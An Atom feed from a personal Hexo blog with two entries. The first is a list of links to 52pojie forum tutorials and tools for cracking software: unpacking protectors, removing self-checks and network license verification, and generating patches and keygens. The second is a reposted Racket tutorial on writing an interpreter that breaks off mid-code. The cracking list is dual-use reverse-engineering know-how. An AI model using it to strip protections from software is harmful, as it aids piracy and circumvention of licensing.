<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>AssassinQ</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://qianfei11.github.io/"/>
  <updated>2019-02-27T09:16:00.743Z</updated>
  <id>https://qianfei11.github.io/</id>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>闭关学习</title>
    <link href="https://qianfei11.github.io/2099/12/31/%E9%97%AD%E5%85%B3%E5%AD%A6%E4%B9%A0/"/>
    <id>https://qianfei11.github.io/2099/12/31/闭关学习/</id>
    <published>2099-12-31T15:59:59.000Z</published>
    <updated>2019-02-27T09:16:00.743Z</updated>
    
    <content type="html"><![CDATA[<p>(´･_･`)</p><a id="more"></a><h1 id="吾爱破解论坛教程"><a href="#吾爱破解论坛教程" class="headerlink" title="吾爱破解论坛教程"></a>吾爱破解论坛教程</h1><p>《吾爱破解培训第一课：破解基础知识之介绍常见工具和壳的特征》 讲师：Hmily，链接：<a href="http://www.52pojie.cn/thread-378612-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-378612-1-1.html</a><br>《吾爱破解培训第二课：实战去广告、弹窗及主页锁定》 讲师：Kido，链接：<a href="http://www.52pojie.cn/thread-384195-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-384195-1-1.html</a><br>《吾爱破解培训第三课：改头换面之修改版权和资源》 讲师：Kido，链接：<a href="http://www.52pojie.cn/thread-389996-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-389996-1-1.html</a><br>《吾爱破解培训第四课：击破程序最坚固的堡垒–实战去程序自校验》 讲师：小生我怕怕，链接：<a href="http://www.52pojie.cn/thread-392395-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-392395-1-1.html</a><br>《吾爱破解培训第五课：反击作者的挑衅–实战解除程序重启验证》 讲师：我是用户，链接：<a href="http://www.52pojie.cn/thread-396068-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-396068-1-1.html</a><br>《吾爱破解培训第六课：潜伏在程序身边的黑影–实战给程序补丁》 讲师：我是用户，链接：<a href="http://www.52pojie.cn/thread-405758-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-405758-1-1.html</a><br>《吾爱破解培训第七课：手把手教你从实例看如何攻破常见的网络验证》 讲师：珈蓝夜雨，链接：<a href="http://www.52pojie.cn/thread-408475-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-408475-1-1.html</a><br>《吾爱破解培训第八课：短兵相接–深入浅出探讨脱壳细节（上）》 讲师：L4Nce，链接：<a href="http://www.52pojie.cn/thread-411104-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-411104-1-1.html</a><br>《吾爱破解培训第九课：短兵相接–深入浅出探讨脱壳细节（下）》 讲师：L4Nce，链接：<a href="http://www.52pojie.cn/thread-411104-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-411104-1-1.html</a><br>《吾爱破解培训第十课：探寻逆向新航标—x64平台脱壳与破解实战》 讲师：Kido，链接：<a href="http://www.52pojie.cn/thread-422192-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-422192-1-1.html</a></p><p>工欲善其事必先利其器，下面是破解需要用到的工具<br>OllyDbg(OD)：<a href="http://www.52pojie.cn/thread-350397-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-350397-1-1.html</a><br>PEID：<a href="http://www.52pojie.cn/thread-170387-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-170387-1-1.html</a><br>Exeinfo PE：<a href="http://www.52pojie.cn/thread-169779-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-169779-1-1.html</a><br>樱花补丁制作工具：<a href="http://www.52pojie.cn/thread-62307-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-62307-1-1.html</a><br>内存补丁生成器：<a href="http://www.52pojie.cn/thread-162411-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-162411-1-1.html</a><br>注册机生成器：<a href="http://www.52pojie.cn/thread-159470-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-159470-1-1.html</a><br>IDA Pro v6.5：<a href="http://www.52pojie.cn/thread-284145-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-284145-1-1.html</a><br>破解工具包：<a href="http://www.52pojie.cn/thread-190698-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-190698-1-1.html</a><br>吾爱云盘【最牛逼的在线工具包】：<a href="http://down.52pojie.cn/Tools/" target="_blank" rel="noopener">http://down.52pojie.cn/Tools/</a></p><p>NO.1<br>Hmily 【初学者教程】破解基础知识之认识壳与程序的特征。<br>新手一看教程就在说程序破解应该先脱壳，那到底程序有没有加壳？加了什么壳？看看大H的文章你就懂了！<br><a href="http://www.52pojie.cn/thread-234739-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-234739-1-1.html</a></p><p>NO.2<br>ximo 脱壳教程(24集全)<br><a href="http://pan.baidu.com/s/1cebVOU" target="_blank" rel="noopener">http://pan.baidu.com/s/1cebVOU</a> 密码: fxia<br><a href="http://down.52pojie.cn/吾爱破解视频教程/ximo脱壳基础.7z" target="_blank" rel="noopener">http://down.52pojie.cn/吾爱破解视频教程/ximo脱壳基础.7z</a><br>来自吾爱破解论坛LCG组织成员也是VMP脱壳插件作者ximo做的脱壳教程，堪称经典，入门脱壳必学！<br>压缩包为7Z格式，7Z官方网站</p><p>NO.3<br>小生我怕怕 脱壳练习系列附带对应文章的动画视频教程，方便学习交流脱壳知识。<br>教程对应动画视频：<a href="http://www.52pojie.cn/thread-11642-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-11642-1-1.html</a></p><p>吾爱专题脱壳练习一—-压缩壳练习之一:<a href="http://www.52pojie.cn/thread-10496-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-10496-1-1.html</a><br>吾爱专题脱壳练习二—-压缩壳练习之二:<a href="http://www.52pojie.cn/thread-10607-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-10607-1-1.html</a><br>吾爱专题脱壳练习三—-压缩壳练习之三:<a href="http://www.52pojie.cn/thread-10688-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-10688-1-1.html</a><br>吾爱破解脱壳练习四——简单加密壳:<a href="http://www.52pojie.cn/thread-10850-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-10850-1-1.html</a><br>吾爱专题脱壳练习五—-upx壳:<a href="http://www.52pojie.cn/thread-10990-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-10990-1-1.html</a><br>吾爱专题脱壳练习六—-TElock V0.99 :<a href="http://www.52pojie.cn/thread-11112-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-11112-1-1.html</a><br>吾爱专题脱壳练习七—-ORiEN:<a href="http://www.52pojie.cn/thread-11244-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-11244-1-1.html</a><br>吾爱专题脱壳练习八—-MoleBox V2.6.5:<a href="http://www.52pojie.cn/thread-11306-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-11306-1-1.html</a><br>吾爱专题脱壳练习九—-CRYPToCRACk’s PE Protector:<a href="http://www.52pojie.cn/thread-11446-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-11446-1-1.html</a><br>吾爱专题脱壳练习十—-PESpin 1.32：<a href="http://www.52pojie.cn/thread-11585-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-11585-1-1.html</a><br>吾爱专题脱壳练习十一—-VB自效验的处理:<a href="http://www.52pojie.cn/thread-11747-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-11747-1-1.html</a><br>吾爱专题脱壳练习十二—-delphi自效验的处理:<a href="http://www.52pojie.cn/thread-11883-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-11883-1-1.html</a><br>吾爱专题脱壳练习十三—-GHF Protector V1.0:<a href="http://www.52pojie.cn/thread-12011-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-12011-1-1.html</a><br>吾爱专题脱壳练习十四—-Armadillo 6.04：<a href="http://www.52pojie.cn/thread-12135-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-12135-1-1.html</a><br>吾爱专题脱壳练习十五—-ACProtector系列保护：<a href="http://www.52pojie.cn/thread-12279-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-12279-1-1.html</a><br>吾爱专题脱壳练习十六—-ACProtector系列保护：<a href="http://www.52pojie.cn/thread-12362-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-12362-1-1.html</a><br>吾爱专题脱壳练习十七—-PEBundle 2.0b5 - 3.0x：<a href="http://www.52pojie.cn/thread-12498-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-12498-1-1.html</a><br>吾爱专题脱壳练习十八—-Armadillo 4.40：<a href="http://www.52pojie.cn/thread-12620-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-12620-1-1.html</a><br>吾爱专题脱壳练习十九—-PUNiSHER 1.5：<a href="http://www.52pojie.cn/thread-12822-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-12822-1-1.html</a><br>吾爱专题脱壳练习二十—-未知壳一：<a href="http://www.52pojie.cn/thread-12936-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-12936-1-1.html</a><br>吾爱专题脱壳练习二十一—-未知壳二：<a href="http://www.52pojie.cn/thread-13494-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-13494-1-1.html</a><br>吾爱专题脱壳练习二十二—-未知壳三：<a href="http://www.52pojie.cn/thread-13770-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-13770-1-1.html</a></p><p>NO.4<br>我是用户 破解实战(10集全)<br>破解实战演练教程<br>第一战:<a href="http://www.52pojie.cn/thread-197281-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-197281-1-1.html</a><br>第二战:<a href="http://www.52pojie.cn/thread-197598-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-197598-1-1.html</a><br>第三战:<a href="http://www.52pojie.cn/thread-197957-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-197957-1-1.html</a><br>第四战:<a href="http://www.52pojie.cn/thread-198203-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-198203-1-1.html</a><br>第五战:<a href="http://www.52pojie.cn/thread-198365-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-198365-1-1.html</a><br>第六战:<a href="http://www.52pojie.cn/thread-198930-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-198930-1-1.html</a><br>第七战:<a href="http://www.52pojie.cn/thread-199459-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-199459-1-1.html</a><br>第八战:<a href="http://www.52pojie.cn/thread-199834-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-199834-1-1.html</a><br>第九战:<a href="http://www.52pojie.cn/thread-200655-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-200655-1-1.html</a><br>第十战:<a href="http://www.52pojie.cn/thread-200798-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-200798-1-1.html</a></p><p>NO.5<br>Blue .NET系列教程(4集全)<br>图文教程分析.net程序！<br>第一课 <a href="http://www.52pojie.cn/thread-248348-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-248348-1-1.html</a><br>第二课 <a href="http://www.52pojie.cn/thread-249034-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-249034-1-1.html</a><br>第三课 <a href="http://www.52pojie.cn/thread-250626-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-250626-1-1.html</a><br>第四课 <a href="http://www.52pojie.cn/thread-250633-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-250633-1-1.html</a></p><p>NO.6<br>去软件弹窗系列教程(共两集)<br>第一课 <a href="http://www.52pojie.cn/thread-316180-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-316180-1-1.html</a><br>第二课 <a href="http://www.52pojie.cn/thread-323346-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-323346-1-1.html</a></p><p>NO.7<br>R4ndom破解教程全文翻译(共七集)<br>第一课 <a href="http://www.52pojie.cn/thread-344925-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-344925-1-1.html</a><br>第二课 <a href="http://www.52pojie.cn/thread-345839-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-345839-1-1.html</a><br>第三课 <a href="http://www.52pojie.cn/thread-346455-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-346455-1-1.html</a><br>第四课 <a href="http://www.52pojie.cn/thread-350727-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-350727-1-1.html</a><br>第五课 <a href="http://www.52pojie.cn/thread-352818-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-352818-1-1.html</a><br>第六课 <a href="http://www.52pojie.cn/thread-354029-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-354029-1-1.html</a><br>第七课 <a href="http://www.52pojie.cn/thread-355207-1-1.html" target="_blank" rel="noopener">http://www.52pojie.cn/thread-355207-1-1.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;(´･_･`)&lt;/p&gt;
    
    </summary>
    
    
      <category term="re" scheme="https://qianfei11.github.io/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>【转】怎样写一个解释器</title>
    <link href="https://qianfei11.github.io/2019/02/28/%E3%80%90%E8%BD%AC%E3%80%91%E6%80%8E%E6%A0%B7%E5%86%99%E4%B8%80%E4%B8%AA%E8%A7%A3%E9%87%8A%E5%99%A8/"/>
    <id>https://qianfei11.github.io/2019/02/28/【转】怎样写一个解释器/</id>
    <published>2019-02-28T05:34:20.000Z</published>
    <updated>2019-02-28T05:56:57.671Z</updated>
    
    <content type="html"><![CDATA[<p>转自<a href="http://www.yinwang.org/blog-cn/2012/08/01/interpreter" target="_blank" rel="noopener">王垠老师的博客</a></p><a id="more"></a><h1 id="怎样写一个解释器"><a href="#怎样写一个解释器" class="headerlink" title="怎样写一个解释器"></a>怎样写一个解释器</h1><p>写一个解释器，通常是设计和实现程序语言的第一步。解释器是简单却又深奥的东西，以至于好多人都不会写，所以我决定写一篇这方面的入门读物。</p><p>虽然我试图从最基本的原理讲起，尽量不依赖于其它知识，但这并不是一本编程入门教材。我假设你已经理解 Scheme 语言，以及基本的编程技巧（比如递归）。如果你完全不了解这些，那我建议你读一下 <a href="https://mitpress.mit.edu/sites/default/files/sicp/index.html" target="_blank" rel="noopener">SICP</a> 的第一，二章，或者 <a href="https://htdp.org/" target="_blank" rel="noopener">HtDP</a> 的前几章，习题可以不做。注意不要读太多书，否则你就回不来了 ;-) 当然你也可以直接读这篇文章，有不懂的地方再去查资料。</p><p>实现语言容易犯的一个错误，就是一开头就试图去实现很复杂的语言（比如 JavaScript 或者 Python）。这样你很快就会因为这些语言的复杂性，以及各种历史遗留的设计问题而受到挫折，最后不了了之。学习实现语言，最好是从最简单，最干净的语言开始，迅速写出一个可用的解释器。之后再逐步往里面添加特性，同时保持正确。这样你才能有条不紊地构造出复杂的解释器。</p><p>因为这个原因，这篇文章只针对一个很简单的语言，名叫“R2”。它可以作为一个简单的计算器用，还具有变量定义，函数定义和调用等功能。</p><h2 id="我们的工具：Racket"><a href="#我们的工具：Racket" class="headerlink" title="我们的工具：Racket"></a>我们的工具：Racket</h2><p>本文的解释器是用 Scheme 语言实现的。Scheme 有很多的“实现”，这里我用的实现叫做 Racket，它可以在这里<a href="http://racket-lang.org/" target="_blank" rel="noopener">免费下载</a>。为了让程序简洁，我用了一点点 Racket 的模式匹配（pattern matching）功能。我对 Scheme 的实现没有特别的偏好，但 Racket 方便易用，适合教学。如果你用其它的 Scheme 实现，可能得自己做一些调整。</p><p>Racket 具有宏（macro），所以它其实可以变成很多种语言。如果你之前用过 DrRacket，那它的“语言设置”可能被你改成了 R5RS 之类的。所以如果下面的程序不能运行，你可能需要检查一下 DrRacket 的“语言设置”，把 Language 设置成 “Racket”。</p><p><img src="http://upload-images.jianshu.io/upload_images/68562-42a709b7a2e7e422.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/200" alt></p><p>Racket 允许使用方括号而不只是圆括号，所以你可以写这样的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(let ([x 1]</span><br><span class="line">      [y 2])</span><br><span class="line">  (+ x y))</span><br></pre></td></tr></table></figure><p>方括号跟圆括号可以互换，唯一的要求是方括号必须和方括号匹配。通常我喜欢用方括号来表示“无动作”的数据（比如上面的 [x 1], [y 2]），这样可以跟函数调用和其它具有“动作”的代码，产生“视觉差”。这对于代码的可读性是一个改善，因为到处都是圆括号的话，确实有点太单调，容易打瞌睡。</p><p>另外，Racket 程序的最上面都需要加上像 #lang racket 这样的语言选择标记，这样 Racket 才可以知道你想用哪个语言变种。</p><h2 id="解释器是什么"><a href="#解释器是什么" class="headerlink" title="解释器是什么"></a>解释器是什么</h2><p>准备工作就到这里。现在我来谈一下，解释器到底是什么。说白了，解释器跟计算器差不多。解释器是一个函数，你输入一个“表达式”，它就输出一个 “值”，像这样：</p><p><img src="http://upload-images.jianshu.io/upload_images/68562-573476c0d8151871.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/400" alt></p><p>比如，你输入表达式 ‘(+ 1 2) ，它就输出值，整数3。表达式是一种“表象”或者“符号”，而值却更加接近“本质”或者“意义”。我们“解释”了符号，得到它的意义，这也许就是为什么它叫做“解释器”。</p><p>需要注意的是，表达式是一个数据结构，而不是一个字符串。我们用一种叫“S 表达式”（S-expression）的结构来存储表达式。比如表达式 ‘(+ 1 2) 其实是一个链表（list），它里面的内容是三个符号（symbol）：+, 1 和 2，而不是字符串”(+ 1 2)”。</p><p>从 S 表达式这样的“结构化数据”里提取信息，方便又可靠，而从字符串里提取信息，麻烦而且容易出错。Scheme（Lisp）语言里面大量使用结构化数据，少用字符串，这是 Lisp 系统比 Unix 系统先进的地方之一。</p><p>从计算理论的角度讲，每个程序都是一台机器的“描述”，而解释器就是在“模拟”这台机器的运转，也就是在进行“计算”。所以从某种意义上讲，解释器就是计算的本质。当然，不同的解释器就会带来不同的计算。</p><p>CPU 也是一个解释器，它专门解释执行机器语言。如果你深刻理解了解释器，就可以从本质上看出各种 CPU 的设计为什么是那个样子，它们有什么优缺点，而不只是被动的作为它们的使用者。</p><h2 id="抽象语法树（Abstract-Syntax-Tree）"><a href="#抽象语法树（Abstract-Syntax-Tree）" class="headerlink" title="抽象语法树（Abstract Syntax Tree）"></a>抽象语法树（Abstract Syntax Tree）</h2><p>用 S 表达式所表示的代码，本质上是一种叫做“树”（tree）的数据结构。更具体一点，这叫做“抽象语法树”（Abstract Syntax Tree，简称 AST）。下文为了简洁，我们省略掉“抽象”两个字，就叫它“语法树”。</p><p>跟普通的树结构一样，语法树里的节点，要么是一个“叶节点”，要么是一颗“子树”。叶节点是不能再细分的“原子”，比如数字，字符串，操作符，变量名。而子树是可以再细分的“结构”，比如算术表达式，函数定义，函数调用，等等。</p><p>举个简单的例子，表达式 ‘(* (+ 1 2) (+ 3 4))，就对应如下的语法树结构：</p><p><img src="http://upload-images.jianshu.io/upload_images/68562-8cedc6f1791d0410.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/300" alt></p><p>其中，<em>，两个+，1，2，3，4 都是叶节点，而那三个红色节点，都表示子树结构：’(+ 1 2)，’(+ 3 4)，’(</em> (+ 1 2) (+ 3 4))。</p><h2 id="树遍历算法"><a href="#树遍历算法" class="headerlink" title="树遍历算法"></a>树遍历算法</h2><p>在基础的数据结构课程里，我们都学过二叉树的遍历操作，也就是所谓先序遍历，中序遍历和后序遍历。语法树跟二叉树，其实没有很大区别，所以你也可以在它上面进行遍历。解释器的算法，就是在语法树上的一种遍历操作。由于这个渊源关系，我们先来做一个遍历二叉树的练习。做好了之后，我们就可以把这段代码扩展成一个解释器。</p><p>这个练习是这样：写出一个函数，名叫tree-sum，它对二叉树进行“求和”，把所有节点里的数加在一起，返回它们的和。举个例子，(tree-sum ‘((1 2) (3 4)))，执行后应该返回 10。注意：这是一颗二叉树，所以不会含有长度超过 2 的子树，你不需要考虑像 ((1 2) (3 4 5)) 这类情况。需要考虑的例子是像这样：(1 2)，(1 (2 3)), ((1 2) 3) ((1 2) (3 4))，……</p><p>（为了达到最好的学习效果，你最好试一下写出这个函数再继续往下看。）</p><p>好了，希望你得到了跟我差不多的结果。我的代码是这个样子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#lang racket</span><br><span class="line"></span><br><span class="line">(define tree-sum</span><br><span class="line">  (lambda (exp)</span><br><span class="line">    (match exp                         ; 对输入exp进行模式匹配</span><br><span class="line">      [(? number? x) x]                ; exp是一个数x吗？如果是，那么返回这个数x</span><br><span class="line">      [`(,e1 ,e2)                      ; exp是一个含有两棵子树的中间节点吗？</span><br><span class="line">       (let ([v1 (tree-sum e1)]        ; 递归调用tree-sum自己，对左子树e1求值</span><br><span class="line">             [v2 (tree-sum e2)])       ; 递归调用tree-sum自己，对右子树e2求值</span><br><span class="line">         (+ v1 v2))])))                ; 返回左右子树结果v1和v2的和</span><br></pre></td></tr></table></figure><p>你可以通过以下的例子来测试它的正确性：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(tree-sum &apos;(1 2))</span><br><span class="line">;; =&gt; 3</span><br><span class="line">(tree-sum &apos;(1 (2 3)))</span><br><span class="line">;; =&gt; 6</span><br><span class="line">(tree-sum &apos;((1 2) 3))</span><br><span class="line">;; =&gt; 6</span><br><span class="line">(tree-sum &apos;((1 2) (3 4)))</span><br><span class="line">;; =&gt; 10</span><br></pre></td></tr></table></figure><p>（完整的代码和示例，可以在<a href="https://github.com/yinwang0/interpreters/blob/master/tree-sum.ss" target="_blank" rel="noopener">这里下载</a>。）</p><p>这个算法很简单，我们可以把它用文字描述如下：</p><ol><li>如果输入 exp 是一个数，那就返回这个数。</li><li>否则如果 exp 是像 (,e1 ,e2) 这样的子树，那么分别对 e1 和 e2 递归调用 tree-sum，进行求和，得到 v1 和 v2，然后返回 v1 + v2 的和。<br>你自己写出来的代码，也许用了 if 或者 cond 语句来进行分支，而我的代码里面使用的是 Racket 的模式匹配（match）。这个例子用 if 或者 cond 其实也可以，但我之后要把这代码扩展成一个解释器，所以提前使用了 match。这样跟后面的代码对比的时候，就更容易看出规律来。接下来，我就简单讲一下这个 match 表达式的工作原理。</li></ol><h2 id="模式匹配"><a href="#模式匹配" class="headerlink" title="模式匹配"></a>模式匹配</h2><p>现在不得不插入一点 Racket 的技术细节，如果你已经学会使用 Racket 的模式匹配，可以跳过这一节。你也可以通过阅读 Racket 模式匹配的<a href="https://docs.racket-lang.org/reference/match.html" target="_blank" rel="noopener">文档</a>来代替这一节。但我建议你不要读太多文档，因为我接下去只用到很少的模式匹配功能，我把它们都解释如下。</p><p>模式匹配的形式一般是这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(match x</span><br><span class="line">  [模式 结果]</span><br><span class="line">  [模式 结果]</span><br><span class="line">   ...   ...</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>它先对 x 求值，然后根据值的结构来进行分支。每个分支由两部分组成，左边是一个模式，右边是一个结果。整个 match 语句的语义是这样：从上到下依次考虑，找到第一个可以匹配 x 的值的模式，返回它右边的结果。左边的模式在匹配之后，可能会绑定一些变量，这些变量可以在右边的表达式里使用。</p><p>模式匹配是一种分支语句，它在逻辑上就是 Scheme（Lisp） 的 cond 表达式，或者 Java 的嵌套条件语句 if … else if … else …。然而跟条件语句里的“条件”不同，每条 match 语句左边的模式，可以准确而形象地描述数据结构的形状，而且可以在匹配的同时，对结构里的成员进行“绑定”。这样我们可以在右边方便的访问结构成员，而不需要使用访问函数（accessor）或者 foo.x 这样的属性语法（attribute）。而且模式可以有嵌套的子结构，所以它能够一次性的表示复杂的数据结构。</p><p>举个实在点的例子。我的代码里用了这样一个 match 表达式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(match exp</span><br><span class="line">  [(? number? x) x]</span><br><span class="line">  [`(,e1 ,e2)</span><br><span class="line">   (let ([v1 (tree-sum e1)]</span><br><span class="line">         [v2 (tree-sum e2)])</span><br><span class="line">     (+ v1 v2))])</span><br></pre></td></tr></table></figure><p>第二行里面的 ‘(,e1 ,e2) 是一个模式（pattern），它被用来匹配 exp 的值。如果 exp 是 ‘(1 2)，那么它与’(,e1 ,e2)匹配的时候，就会把 e1 绑定到 ‘1，把 e2 绑定到 ‘2。这是因为它们结构相同：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">`(,e1 ,e2)</span><br><span class="line">&apos;(  1   2)</span><br></pre></td></tr></table></figure><p>说白了，模式就是一个可以含有“名字”（像 e1 和 e2）的结构，像 ‘(,e1 ,e2)。我们拿这个带有名字的结构，去匹配实际数据，像 ‘(1 2)。当它们一一对应之后，这些名字就被绑定到数据里对应位置的值。</p><p>第一行的“模式”比较特殊，(? number? x) 表示的，其实是一个普通的条件判断，相当于 (number? exp)，如果这个条件成立，那么它把 exp 的值绑定到 x，这样右边就可以用 x 来指代 exp。对于无法细分的结构（比如数字，布尔值），你只能用这种方式来“匹配”。看起来有点奇怪，不过习惯了就好了。</p><p>模式匹配对解释器和编译器的书写相当有用，因为程序的语法树往往具有嵌套的结构。不用模式匹配的话，往往要写冗长，复杂，不直观的代码，才能描述出期望的结构。而且由于结构的嵌套比较深，很容易漏掉边界情况，造成错误。模式匹配可以直观的描述期望的结构，避免漏掉边界情况，而且可以方便的访问结构成员。</p><p>由于这个原因，很多源于 ML 的语言（比如 OCaml，Haskell）都有模式匹配的功能。因为 ML（Meta-Language）原来设计的用途，就是用来实现程序语言的。Racket 的模式匹配也是部分受了 ML 的启发，实际上它们的原理是一模一样的。</p><p>好了，树遍历的练习就做到这里。然而这跟解释器有什么关系呢？下面我们只把它改一下，就可以得到一个简单的解释器。</p><h2 id="一个计算器"><a href="#一个计算器" class="headerlink" title="一个计算器"></a>一个计算器</h2><p>计算器也是一种解释器，只不过它只能处理算术表达式。我们的下一个目标，就是写出一个计算器。如果你给它 ‘(* (+ 1 2) (+ 3 4))，它就输出 21。可不要小看这个计算器，稍后我们把它稍加改造，就可以得到一个更多功能的解释器。</p><p>上面的代码里，我们利用递归遍历，对树里的数字求和。那段代码里，其实已经隐藏了一个解释器的框架。你观察一下，一个算术表达式 ‘(<em> (+ 1 2) (+ 3 4))，跟二叉树 ‘((1 2) (3 4)) 有什么不同？发现没有，这个算术表达式比起二叉树，只不过在每个子树结构里多出了一个操作符：一个 </em> 和两个 + 。它不再是一棵二叉树，而是一种更通用的树结构。</p><p>这点区别，也就带来了二叉树求和与解释器算法的区别。对二叉树进行求和的时候，在每个子树节点，我们都做加法。而对表达式进行解释的时候，在每一个子树节点，我们不一定进行加法。根据子树的“操作符”不同，我们可能会选择加，减，乘，除四种操作。</p><p>好了，下面就是这个计算器的代码。它接受一个表达式，输出一个数字作为结果。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#lang racket                                  ; 声明用 Racket 语言</span><br><span class="line"></span><br><span class="line">(define calc</span><br><span class="line">  (lambda (exp)</span><br><span class="line">    (match exp                                ; 分支匹配：表达式的两种情况</span><br><span class="line">      [(? number? x) x]                       ; 是数字，直接返回</span><br><span class="line">      [`(,op ,e1 ,e2)                         ; 匹配提取操作符op和两个操作数e1,e2</span><br><span class="line">       (let ([v1 (calc e1)]                   ; 递归调用 calc 自己，得到 e1 的值</span><br><span class="line">             [v2 (calc e2)])                  ; 递归调用 calc 自己，得到 e2 的值</span><br><span class="line">         (match op                            ; 分支匹配：操作符 op 的 4 种情况</span><br><span class="line">           [&apos;+ (+ v1 v2)]                     ; 如果是加号，输出结果为 (+ v1 v2)</span><br><span class="line">           [&apos;- (- v1 v2)]                     ; 如果是减号，乘号，除号，相似的处理</span><br><span class="line">           [&apos;* (* v1 v2)]</span><br><span class="line">           [&apos;/ (/ v1 v2)]))])))</span><br></pre></td></tr></table></figure><p>你可以得到如下的结果：</p><figure class="highlight 